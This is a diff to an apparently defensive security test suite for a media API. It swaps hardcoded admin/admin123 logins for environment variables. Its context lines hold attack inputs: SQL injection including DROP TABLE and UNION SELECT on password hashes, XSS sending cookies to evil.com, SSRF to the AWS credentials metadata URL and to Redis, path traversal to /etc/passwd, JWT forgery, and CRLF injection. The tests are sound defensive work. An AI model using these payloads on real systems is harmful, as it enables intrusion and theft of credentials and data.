@@ -24,7 +24,7 @@ test_cases:
     platforms: [api]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Send classic SQL injection in search"
         action: "GET /api/v1/entities?search=' OR 1=1-- with Authorization header"
@@ -46,7 +46,7 @@ test_cases:
     platforms: [api]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Send DROP TABLE injection in search"
         action: "GET /api/v1/entities?search='; DROP TABLE media_items; -- with Authorization header"
@@ -68,7 +68,7 @@ test_cases:
     platforms: [api]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Send UNION SELECT injection targeting users"
         action: "GET /api/v1/entities?search=' UNION SELECT id,username,password_hash,role,'','','','','','','','','' FROM users-- with Authorization header"
@@ -90,7 +90,7 @@ test_cases:
     platforms: [api]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Send blind injection with true condition"
         action: "GET /api/v1/entities?search=' AND 1=1-- with Authorization header"
@@ -133,7 +133,7 @@ test_cases:
     platforms: [api, web]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Create entity with script tag payload"
         action: "POST /api/v1/entities with body {\"title\":\"<script>document.location='http://evil.com/steal?c='+document.cookie</script>\",\"media_type\":\"movie\"}"
@@ -155,7 +155,7 @@ test_cases:
     platforms: [api, web]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Create entity with onmouseover payload"
         action: "POST /api/v1/entities with body {\"title\":\"Test Movie\",\"description\":\"<div onmouseover=\\\"fetch('http://evil.com/'+document.cookie)\\\">Hover here</div>\",\"media_type\":\"movie\"}"
@@ -177,7 +177,7 @@ test_cases:
     platforms: [api, web]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Create entity with SVG XSS"
         action: "POST /api/v1/entities with body {\"title\":\"<svg/onload=alert('XSS')>\",\"media_type\":\"movie\"}"
@@ -199,7 +199,7 @@ test_cases:
     platforms: [api, web]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Create entity with data URI XSS"
         action: "POST /api/v1/entities with body {\"title\":\"<a href=\\\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\\\">Click me</a>\",\"media_type\":\"movie\"}"
@@ -221,7 +221,7 @@ test_cases:
     platforms: [api, web]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Create entity with HTML entity encoded XSS"
         action: "POST /api/v1/entities with body {\"title\":\"&#60;script&#62;alert('XSS')&#60;/script&#62;\",\"media_type\":\"movie\"}"
@@ -248,7 +248,7 @@ test_cases:
     platforms: [api]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Submit storage root with internal IP 10.x"
         action: "POST /api/v1/storage-roots with body {\"name\":\"evil\",\"path\":\"http://10.0.0.1:8080/internal-api\",\"protocol\":\"webdav\"}"
@@ -270,7 +270,7 @@ test_cases:
     platforms: [api]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Submit AWS metadata URL"
         action: "POST /api/v1/storage-roots with body {\"name\":\"aws-meta\",\"path\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\",\"protocol\":\"webdav\"}"
@@ -292,7 +292,7 @@ test_cases:
     platforms: [api]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Submit localhost URL targeting Redis"
         action: "POST /api/v1/storage-roots with body {\"name\":\"redis\",\"path\":\"http://127.0.0.1:6379/\",\"protocol\":\"webdav\"}"
@@ -338,7 +338,7 @@ test_cases:
     platforms: [api]
     steps:
       - name: "Login and get valid token"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with valid JWT token"
       - name: "Modify token payload and resign with wrong key"
         action: "Decode JWT, change role to 'superadmin', resign with key 'attacker-secret-key'"
@@ -459,7 +459,7 @@ test_cases:
         action: "POST /api/v1/collections with body {\"name\":\"My Private Collection\"} using user A token"
         expected: "201 Created with collection ID"
       - name: "Login as user B (admin)"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token for user B"
       - name: "Attempt to modify user A's collection as user B"
         action: "PUT /api/v1/collections/{user_a_collection_id} with body {\"name\":\"Stolen\"} using user B non-admin token"
@@ -524,7 +524,7 @@ test_cases:
     platforms: [api]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Request /etc/passwd via traversal"
         action: "GET /api/v1/files?path=../../../../../../../etc/passwd with Authorization header"
@@ -549,7 +549,7 @@ test_cases:
     platforms: [api]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "URL-encoded traversal"
         action: "GET /api/v1/files?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
@@ -574,7 +574,7 @@ test_cases:
     platforms: [api]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Null byte to truncate extension"
         action: "GET /api/v1/files?path=../../../etc/passwd%00.jpg"
@@ -598,7 +598,7 @@ test_cases:
     platforms: [api, web]
     steps:
       - name: "Login and get token"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Send POST from unauthorized origin"
         action: "POST /api/v1/collections with body {\"name\":\"CSRF Test\"}, Authorization header, and Origin: http://evil.example.com"
@@ -639,7 +639,7 @@ test_cases:
     platforms: [api, web]
     steps:
       - name: "Simulate form POST from external site"
-        action: "POST /api/v1/auth/login with Content-Type: application/x-www-form-urlencoded and body username=admin&password=admin123 from Origin: http://evil.com"
+        action: "POST /api/v1/auth/login with Content-Type: application/x-www-form-urlencoded and body username=${HELIX_TEST_USER}&password=${HELIX_TEST_PASSWORD} from Origin: http://evil.com"
         expected: "415 Unsupported Media Type or CORS rejection (API requires application/json)"
       - name: "Verify JSON content type enforced"
         action: "POST /api/v1/collections with Content-Type: multipart/form-data and Origin: http://evil.com"
@@ -660,7 +660,7 @@ test_cases:
     platforms: [api]
     steps:
       - name: "Login as admin"
-        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        action: "POST /api/v1/auth/login with body {\"username\":\"${HELIX_TEST_USER}\",\"password\":\"${HELIX_TEST_PASSWORD}\"}"
         expected: "200 OK with JWT token"
       - name: "Send CRLF in search parameter"
         action: "GET /api/v1/entities?search=test%0d%0aX-Injected-Header:%20evil with Authorization header"
